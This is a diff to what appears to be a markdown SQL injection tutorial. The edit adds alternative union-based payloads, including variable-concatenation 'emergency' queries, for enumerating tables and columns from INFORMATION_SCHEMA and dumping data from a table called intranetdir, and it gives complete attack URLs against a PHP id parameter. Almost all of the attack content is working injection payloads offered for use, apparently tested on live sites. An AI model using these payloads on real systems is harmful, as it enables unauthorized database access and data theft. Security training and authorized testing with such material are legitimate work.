@@ -297,10 +297,17 @@ Because the 1st column was being reflected to the website, we have to replace th
 
 - Convert the database name into 0xHEX: **0x6462313039**
 
-- Since we know the database name, let's dump tables name using this payload (using group_concat() ):
-```(SELECT+GROUP_CONCAT(table_name+SEPARATOR)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039)```  
+- Since we know the database name, let's dump tables name using this payload (using group_concat() ):  
+```sql
+(SELECT+GROUP_CONCAT(table_name+SEPARATOR)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039)
+```  
 
 - Our payload will be: ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(able_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039),2,3,4-- -```  
+
+I've tested this query and most of the time it's effective, but there are some websites which for some reason, doesn't accept this query, so I came up with the following query to use in case of "emergency":  
+```sql
+(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)
+```
 
 ![table_dumped](https://i.imgur.com/cUbdS47.png)
 
@@ -311,7 +318,14 @@ Now all the tables are all dumped. I will focus on the table names **intranetdir
 - Convert the table name into 0xHEX: **0x696e7472616e6574646972**
 
 - We will use this payload group_concat() to dump the columns:  
-```(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972)```
+```sql
+(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972)
+```
+Alternatively you can use the following query as well (same function, different approach):  
+```sql
+(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x696e7472616e6574646972)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)
+```
+Where **0x696e7472616e6574646972** is 0xHEX of table name (**intranetdir**).  
 
 - The final URL with Payload will be:  
 ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972),2,3,4-- -```  
@@ -322,12 +336,24 @@ Now all the tables are all dumped. I will focus on the table names **intranetdir
 
 All the columns of the name named **intranetdir** are dumped. In this case I will dump the data inside **name** column. For our final payload, we need to use database's name in 0xHEX, table's name in 0xHEX and column's name in 0xHEX.
 
-- database: **db109**
-table: **intranetdir**
-column: **name**
+- database: **db109**  
+table: **intranetdir**  
+column: **name**  
 
-- The final payload will be: ```(SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir)```
+- You can use the following 3 queries to dump the data from the column **name**: 
+```sql
+(SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir)
+```
+```sql
+(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(db109.intranetdir)WHERE(@x)IN(@x:=CONCAT(0x20,@x,name,0x3c62723e))))x)
+```
+```sql
+(SELECT+GROUP_CONCAT(0x3c62723e,name)+FROM (db109.intranetdir))
+```
 
-- The final URL + Payload will be: ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir),2,3,4-- -```
+- Let's use the first query (which I use the most). Assuming the 1st column is vulnerable, the final URL will be: 
+```sql
+http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir),2,3,4-- -
+```
 
 - Now we have dumped all the data inside **name** column.
